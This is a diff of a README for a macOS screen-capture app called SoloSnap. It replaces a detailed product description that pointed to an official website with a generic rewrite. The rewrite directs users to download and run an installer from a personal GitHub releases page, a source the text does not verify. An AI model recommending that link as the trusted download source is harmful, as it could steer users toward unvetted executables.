@@ -1,226 +1,97 @@
-# SoloSnap
+# 📸 SoloSnap - Capture Screens Fast and Easily
 
-**Professional Screen Capture & Recording for macOS**
+[![Download SoloSnap](https://img.shields.io/badge/Download%20SoloSnap-%23007acc.svg?&style=for-the-badge&logo=github&logoColor=white)](https://github.com/sakshi-code-cse/SoloSnap/releases)
 
----
+## 📝 Overview
 
-## About SoloSnap
+SoloSnap is a powerful screenshot and screen recording app for macOS. It focuses on privacy and accessibility. With SoloSnap, you can capture your screen in several ways: full screen, selected area, or specific window. You can also record your screen, with high-quality visuals and optional audio capture. 
 
-SoloSnap is a professional-grade screen capture and recording application designed exclusively for macOS. Built with accessibility as a core principle, SoloSnap provides an intuitive and powerful solution for users of all abilities while maintaining the highest standards of performance and reliability.
+## 🚀 Getting Started
 
-The application combines advanced capture technology with comprehensive accessibility features, making it the ideal choice for content creators, developers, educators, business professionals, and users with disabilities who require reliable and efficient screen capture capabilities.
+### 📥 Download Application
 
----
+To download SoloSnap, visit the [Releases page](https://github.com/sakshi-code-cse/SoloSnap/releases). Here, you will find the latest version of the app. Look for the version you want and click on the link to download. 
 
-## Key Features
+### 🖥️ System Requirements
 
-### Screenshot Capabilities
-- **Area Selection** - Capture any rectangular area with precision
-- **Full Screen** - Capture entire displays with high resolution support
-- **Window Capture** - Individual application window capture with clean borders
-- **Multi-Display Support** - Simultaneous capture of all connected displays
-- **Format Options** - PNG, JPEG, and TIFF output formats
+To use SoloSnap, ensure your system meets these requirements:
 
-### Screen Recording
-- **Dual Engine Support** - QuickTime and MobilityCore integration
-- **Flexible Targets** - Record main display, current display, or all displays
-- **High Quality Output** - MOV format with H.264 encoding
-- **Audio Recording** - System audio and microphone capture options
-- **Cursor Control** - Show or hide cursor with highlighting options
+- **Operating System**: macOS 13 or later
+- **Architecture**: Apple Silicon or Intel processor
+- **Disk Space**: At least 100 MB of free space
+- **Memory**: Minimum 4 GB RAM
 
-### Camera Integration
-- **Picture-in-Picture Overlay** - Draggable camera window for recordings
-- **Resolution Options** - 720p and 1080p with 30/60 FPS support
-- **Smart Positioning** - Snap-to-margin functionality with safe zones
-- **Appearance Customization** - Corner radius, opacity, and size controls
-- **Multi-Camera Support** - Switch between available camera devices
+### 🔧 Features
 
-### Accessibility Features
-- **VoiceOver Compatibility** - Complete screen reader support
-- **Keyboard Navigation** - Full keyboard control of all features
-- **Motor Accessibility** - Support for users with motor difficulties
-- **Visual Accessibility** - High contrast and large text support
-- **Customizable Interface** - Adaptable to individual needs
+- **Flexible Screen Captures**: Take full-screen shots, capture specific windows, or select a portion of your screen.
+- **Screen Recording**: Record your screen with or without audio.
+- **Multi-Display Support**: Capture all your screens seamlessly.
+- **User-Friendly Interface**: Easy for anyone to navigate and use.
+- **Privacy Focused**: Built to respect your privacy; no unnecessary data collection.
 
-### Global Hotkeys
-- **Fully Customizable** - Set custom key combinations for all actions
-- **Default Shortcuts** - Standard macOS-style keyboard shortcuts
-- **Conflict Detection** - Automatic identification of key conflicts
-- **System-wide Registration** - Works from any application
-- **Accessibility Integration** - Compatible with assistive technologies
+## 💻 Download & Install
 
-### Menu Bar Integration
-- **Always Accessible** - Persistent menu bar icon for instant access
-- **Customizable Appearance** - Choose icon colors and styles
-- **Status Indicators** - Visual feedback for active operations
-- **Quick Actions** - Direct access to all features
-- **Settings Integration** - One-click access to preferences
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/sakshi-code-cse/SoloSnap/releases).
+2. **Choose the Version**: Look for the latest release version.
+3. **Download the Installer**: Click the link for the macOS installer file.
+4. **Open the Installer**: Once downloaded, locate the file in your Downloads folder.
+5. **Install SoloSnap**: Double-click the installer to start the installation process. Follow the on-screen instructions.
+6. **Launch the App**: After installation, open SoloSnap from your Applications folder or using Spotlight.
 
----
+## 📚 User Guide
 
-## Display Management
+### 📸 Taking Screenshots
 
-### Intelligent Detection
-SoloSnap automatically detects your display configuration and adapts available features accordingly.
+1. Open SoloSnap.
+2. Choose the type of screen capture: full screen, window, or selection.
+3. Follow the prompts to capture your desired area.
 
-### Single Display Mode
-When one display is detected, SoloSnap provides essential capture features:
-- Selection Screenshot
-- Full Screen Screenshot  
-- Window Screenshot
-- Main Display Recording
+### 🎥 Recording Your Screen
 
-### Multi-Display Mode
-When multiple displays are detected, all features become available:
-- All single display features
-- Current Display Screenshot
-- Capture All Displays
-- Current Display Recording
-- Active Display Recording
-- All Displays Recording
+1. Open SoloSnap.
+2. Click on the "Record" option.
+3. Select whether to include audio.
+4. Click "Start Recording" and stop when done.
 
-### Feature Availability
+### 🍽️ Customizing Settings
 
-| Feature | Single Display | Multi-Display |
-|---------|----------------|---------------|
-| Selection Screenshot | ✓ | ✓ |
-| Full Screen Screenshot | ✓ | ✓ |
-| Window Screenshot | ✓ | ✓ |
-| Current Display Screenshot | ✗ | ✓ |
-| Capture All Displays | ✗ | ✓ |
-| Main Display Recording | ✓ | ✓ |
-| Current Display Recording | ✗ | ✓ |
-| Active Display Recording | ✗ | ✓ |
-| All Displays Recording | ✗ | ✓ |
+- Access settings from the main menu.
+- Choose options for file format, default save location, and audio input.
 
----
+## 🤝 Support
 
-## Default Keyboard Shortcuts
+If you encounter any issues, you can find answers in the FAQ section of the Releases page. For direct help, you may also open an issue in the repository.
 
-| Shortcut | Action |
-|----------|--------|
-| ⌘⇧3 | Full Screen Screenshot |
-| ⌘⇧4 | Selection Screenshot |
-| ⌘⇧5 | Window Screenshot |
-| ⌘⇧6 | Current Display Screenshot |
-| ⌘⇧7 | Capture All Displays |
-| ⌘⇧R | Toggle Recording |
-| ⌘⇧, | Open Settings |
+## 🔗 Additional Resources
 
-*All shortcuts are fully customizable*
+- [Feature Requests](https://github.com/sakshi-code-cse/SoloSnap/issues) - Suggest new features.
+- [Known Issues](https://github.com/sakshi-code-cse/SoloSnap/issues) - Check for any known bugs.
 
----
+## 🌍 Topics
 
-## System Requirements
+SoloSnap is related to:
 
-- **macOS** 13.0 (Ventura) or later
-- **Architecture** Apple Silicon or Intel
-- **Memory** 4GB minimum, 8GB recommended
-- **Storage** 100MB for application
-- **Permissions** Screen Recording (required), Camera (optional), Microphone (optional)
+- accessibility-matters
+- accessibility-tools
+- apple-silicon
+- disability-empowerment
+- disability-tech
+- macos-app
+- macos-menubar
+- macos13
+- macos14
+- macos15
+- macostahoe
+- multi-display
+- recordingstudio
+- screenshots
 
----
+## 🔄 Update Information
 
-## Installation
+Keep your application updated by regularly checking the [Releases page](https://github.com/sakshi-code-cse/SoloSnap/releases). Updates may include new features and bug fixes that enhance your experience.
 
-1. Download SoloSnap from the official source
-2. Drag the application to your Applications folder
-3. Launch SoloSnap from Applications or Spotlight
-4. Grant necessary permissions when prompted
+## 📢 Feedback
 
----
+Your input is valuable. Share your feedback to help us improve SoloSnap. Engage with us on GitHub or reach out through our support channels.
 
-## Use Cases
-
-### Content Creators
-Professional screen recordings with camera overlay for tutorials, live streaming, and social media content.
-
-### Developers
-Precise screen captures for bug reports, code demonstrations, documentation, and technical presentations.
-
-### Educators
-High-quality recordings for online courses, student demonstrations, presentations, and interactive tutorials.
-
-### Business Users
-Clean, professional captures for presentations, documentation, training materials, and client demonstrations.
-
-### Users with Disabilities
-Accessible interface with customizable hotkeys, VoiceOver support, and motor accessibility features.
-
----
-
-## Privacy & Security
-
-- **Local Processing** - All operations performed on your device
-- **No Data Collection** - Your content never leaves your Mac
-- **Minimal Permissions** - Only requests necessary system access
-- **Secure Storage** - Encrypted preference storage
-- **Privacy Compliance** - Full compliance with Apple's privacy guidelines
-
----
-
-## Support
-
-For technical support, feature requests, bug reports, or general inquiries, please contact us through our official support channels at [https://getsolosnap.com/contact](https://getsolosnap.com/contact).
-
-### Common Solutions
-
-**Permission Issues**
-1. Go to System Preferences > Security & Privacy
-2. Select the Privacy tab
-3. Choose Screen Recording
-4. Enable SoloSnap
-
-**Hotkey Conflicts**
-1. Check for conflicts with other applications
-2. Restart SoloSnap
-3. Reset hotkeys to defaults
-4. Verify accessibility permissions
-
-**Camera Not Working**
-1. Grant camera permission when prompted
-2. Ensure camera is not in use by another application
-3. Try selecting a different camera device
-4. Restart SoloSnap
-
----
-
-## Version Information
-
-**Current Version:** 1.3 (Build 20250115)
-
-### Recent Updates
-- Enhanced camera overlay system
-- Improved multi-display capture
-- Better hotkey conflict detection
-- Performance optimizations
-- UI/UX improvements
-- Enhanced accessibility features
-
-### Planned Features
-- Advanced editing tools
-- Team collaboration features
-- Additional accessibility enhancements
-
----
-
-## License
-
-SoloSnap is completely free to use with no limitations or restrictions.
-
-- No subscription fees
-- No premium features
-- No hidden costs
-- All features included
-
----
-
-## Acknowledgments
-
-Special thanks to our beta testers, users, and the accessibility community for their valuable feedback and guidance in making SoloSnap better for everyone.
-
----
-
-**Ready to elevate your screen capture workflow?**
-
-*Experience the future of accessible macOS screen recording*
+[![Download SoloSnap](https://img.shields.io/badge/Download%20SoloSnap-%23007acc.svg?&style=for-the-badge&logo=github&logoColor=white)](https://github.com/sakshi-code-cse/SoloSnap/releases)
